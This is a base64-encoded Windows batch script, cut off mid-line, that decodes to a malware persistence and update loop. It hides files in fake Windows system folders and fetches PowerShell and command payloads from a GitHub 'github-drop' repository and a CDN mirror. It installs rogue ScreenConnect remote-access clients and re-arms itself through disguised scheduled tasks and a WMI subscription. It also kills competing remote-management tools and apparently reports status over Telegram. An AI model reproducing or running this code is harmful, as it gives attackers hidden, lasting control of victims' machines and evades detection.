RUVQX0ZQPTVmNjAxMDU3OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3Ig0K
c2V0ICJHUllYQV9GUD05OTA4MTk4ZTY2OGU0NzUwIg0Kc2V0ICJXRD1DOlxQcm9ncmFtRGF0YVxN
aWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiRVRMPUM6XFByb2dyYW1E
YXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxv
d25fbW9uLmxvZyINCnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9
JVdEJVxoYi5mbGFnIg0Kc2V0ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSIN
CnNldCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1
Yi1kcm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIlRHMj1o
dHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19y
ZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3Lmdp
dGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1cmUu
Y21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90PSVSQU5E
T00lJVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5j
b20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRP
TSUiDQpzZXQgIk9XTk1PTjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dp
dGh1Yi1kcm9wQG1haW4vb3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05M
SUI9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
L21haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUIyPWh0dHBz
Oi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIu
cHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTVNJX1VSTD1odHRwczovL3VpLnNldnJ6LmNv
bS9CaW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVzdCINCnNl
dCAiTVNJX0dSWVhBPWh0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVu
dFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5n
aXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0K
c2V0ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHVi
LWRyb3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0
LkNsaWVudFNldHVwLm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cubXNpIg0Kc2V0ICJNU0lf
Rz0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3QuR3J5eGEubXNpIg0Kc2V0ICJNU0lDQUNIRV9H
PSVXRCVccGtnX2dyeXhhLm1zaSINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdEJSIgMj5u
dWwNCmlmIG5vdCBleGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0ICJN
T05WRVI9TTMxIg0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpzZXQgIkdSWVhBX0RF
RVA9JVdEJVxncnl4YV9kZWVwLmZsYWciDQpyZW0gbG9hZCBjdXJyZW50IEdyeXhhIEZQIChtYXkg
cm90YXRlIHdoZW4gc2VydmVyL2tleXMgY2hhbmdlKQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2Zn
IiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5
eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCIN
CmlmIG5vdCBkZWZpbmVkIEdSWVhBX0ZQIHNldCAiR1JZWEFfRlA9OTkwODE5OGU2NjhlNDc1MCIN
CmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAi
RFQ9JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEg
W3ZlciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RB
TExFRD0wIg0Kc2V0ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xF
RlQ9MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g
4pSA4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tzIHJh
Y2luZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2siDQppZiBleGlz
dCAiJU1VVEVYJSIgKA0KICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0l
JX50QSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
aWYoKFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1s
dCA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2
ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVu
ZGxvY2FsDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9N
JT4iJU1VVEVYJSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1
cmUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAy
PiYxDQppZiBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5z
PTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0l
JUwiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIg0KaWYg
bm90IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZlckhlYWx0aCINCmlmIG5vdCBk
ZWZpbmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlIb3N0UHJveHkiDQppZiBub3QgZGVmaW5lZCBU
QVNLX0Qgc2V0ICJUQVNLX0Q9VGNwSXBDb25mbGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Eg
c2V0ICJNT19BPTIiDQppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA
4pSAIFtBXSBhdXRvLXVwZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBub3QgZXhpc3Qg
IiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tl
IC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3
IiAiJVRHJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVD
VVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3Jl
cG9ydC5uZXciICIlVEcyJSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVw
b3J0LnBzMSIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlV0QlXHRn
X3JlcG9ydC5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVx0Z19yZXBvcnQubmV3
IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVdE
JVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVx0Z19yZXBvcnQubmV3
IiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91
dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51
bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0t
Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIg
IiVPV05TRUMyJSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX3NlY3VyZS5j
bWQiID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVXRCVcb3duX3Nl
Y3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fc2VjdXJlLm5ldyIp
IGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVc
b3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXG93bl9zZWN1cmUubmV3
IiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91
dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIgPm51bCAy
PiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVj
dC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIy
JSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4m
MQ0KZmluZHN0ciAvQzoiT1dOX0xJQiAgQlVJTEQiICIlV0QlXG93bl9saWIubmV3IiA+bnVsIDI+
JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcb3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUw
MCBtb3ZlIC95ICIlV0QlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYx
DQpkZWwgL2YgL3EgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4mMQ0KcmVtIHNlbGYtdXBkYXRl
OiBkb3dubG9hZCBuZXcgb3duX21vbiwgYXBwbHkgQUZURVIgdGhpcyB0aWNrIChCVUlMRC12ZXJp
ZmllZCkNCnNldCAiU0VMRl9VUEQ9MCINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNv
bm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9X
Tk1PTiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9tb24ubmV4dCIgIiVDVVJM
JSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24u
bmV4dCIgIiVPV05NT04yJSIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fTU9OICBCVUlMRCIg
IiVXRCVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZm9yICUl
RiBpbiAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKA0KICBmYyAv
YiAiJVdEJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgaWYg
ZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCikNCmlmICIlU0VMRl9VUEQlIj09IjAiIGRl
bCAvZiAvcSAiJVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KDQpyZW0g4pSA4pSAIFtCXSBy
ZS1hcm0gY2hhaW4gMTogb3duZXJzaGlwLWF3YXJlIChub3QgZXhpc3RlbmNlLW9ubHkpIOKUgOKU
gA0KcmVtIEwxMS9NMjI6IFF1ZXJ5LW9ubHkgc2tpcHBlZCByZWFybSB3aGVuIFdpbmRvd3MgYnVp
bHQtaW4gdGFza3Mgc2hhcmVkDQpyZW0gZGVmYXVsdCBuYW1lcyAoRGlhZ25vc2lzXFNjaGVkdWxl
ZCBldGMuKSAtPiBtb24gbmV2ZXIgcmFuLCBubyBsb2cuDQppZiBleGlzdCAiJVdEJVxvd25fbGli
LnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGFza3MtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAt
TW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyAoDQogICAgZWNobyB0YXNrc19lbnN1cmUg
JSVSPj4iJUxPRyUiDQogICAgc2V0ICJUQVNLU19FTlNVUkU9JSVSIg0KICApDQopDQppZiBub3Qg
ZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3du
X21vbi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAy
PiYxDQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51
bCAyPiYxDQopDQoNCnJlbSDilIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlw
dGlvbikgaWYgbWlzc2luZyDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIl
V0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChg
cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5
cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdv
cmtEaXIgIiVXRCUiIC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RB
VEU9JSVSIg0KICBpZiAvSSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdN
SSBSRUFSTUVEPj4iJUxPRyUiDQopDQoNCnJlbSDilIDilIAgW0UwXSBzeW5jIEdyeXhhIEZQIGZy
b20gUnVubmluZyBub24tc2V2cnogU0MgQkVGT1JFIGV4dGVybWluYXRlDQpyZW0gICAgIChwcmV2
ZW50cyBraWxsaW5nIEdyeXhhIGFzIGZvcmVpZ24gZXZlcnkgdGljaykNCmlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
Z3J5eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjENCiAgaWYgZXhpc3QgIiVXRCVc
Z3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAo
IiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhB
X0ZQPSUlTCINCikNCg0KcmVtIOKUgOKUgCBbRV0gZXh0ZXJtaW5hdGUgZm9yZWlnbiBTQyArIGRp
c2FsbG93ZWQgUk1NIChBRlRFUiBHcnl4YSBGUCBzeW5jKSDilIDilIANCmlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGV4dGVy
bWluYXRlIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KdGltZW91dCAvdCA4IC9ub2Jy
ZWFrID5udWwNCnNldCAiRk9SRUlHTl9MRUZUPTAiDQpmb3IgL2YgInRva2Vucz0yIGRlbGltcz0o
KSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9O
QU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQogIHNldCAiRlA9JSVhIg0KICBzZXQg
IkZQPSFGUDogPSEiDQogIGlmIC9JIG5vdCAiIUZQISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAi
IUZQISI9PSIlQUxUX0ZQJSIgaWYgL0kgbm90ICIhRlAhIj09IiVHUllYQV9GUCUiICgNCiAgICBz
ZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1JF
SUdOX0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAh
Pj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHBy
aW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tlbnM9MSwyIGRl
bGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9G
UCUpIiBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgIklOU1RBTExF
RD0xIg0KICBzZXQgIlBSSU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2
ZWwgMSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQrPTENCikNCnNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
cmxldmVsIDEgc2V0IC9hIENPVU5UKz0xDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNl
dCAiQUxUX09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAi
ICgNCiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBzdGFydCAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25v
YnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSki
IHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9P
Sz0xIg0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lTVEVSRUQg
cHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUg
c2VydmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykNCmlmICIl
SU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgZXNjYWxh
dGUgcmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdv
cmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVs
DQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJS
VU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpy
ZW0gTTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVh
dGVuIGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0
LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUNCnJlbSBmcmVzaC1pbnN0YWxsIGxh
ZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0aW5nICJ3b250IHN0YXJ0IiBmb3JldmVyLg0KaWYg
IiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQgIlJFR1NUQVRF
PXVua25vd24iDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0i
ICUlUiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
blBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJl
ZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiJykgZG8gc2V0ICJSRUdTVEFURT0lJVIi
DQogIGVjaG8gb3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYgL0kgIiFSRUdT
VEFURSEiPT0ibm8iICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZT4+IiVMT0clIg0K
ICAgIHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
MQ0KICAgIHNldCAiSU5TVEFMTEVEPTAiDQogICkNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBp
ZiAiJVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
dGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAic3ZjLXdv
bnQtc3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3Qg
KCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpBZnRlckhlYWwN
CikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRlckhlYWwNCg0KcmVtIOKUgOKUgCBb
RF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTTEyOiBG
SVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0
aG91dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2lleGVjIGluc3Rh
bGwgb25seSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3NpbmcgLSBoZWFsIGJlZ2luPj4iJUxP
RyUiDQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90
IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0K
ICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVjdCBzdGls
bCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQvR1JZWEENCnNldCAiUkVH
U1RBVEU9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJh
Y2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
b24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJS
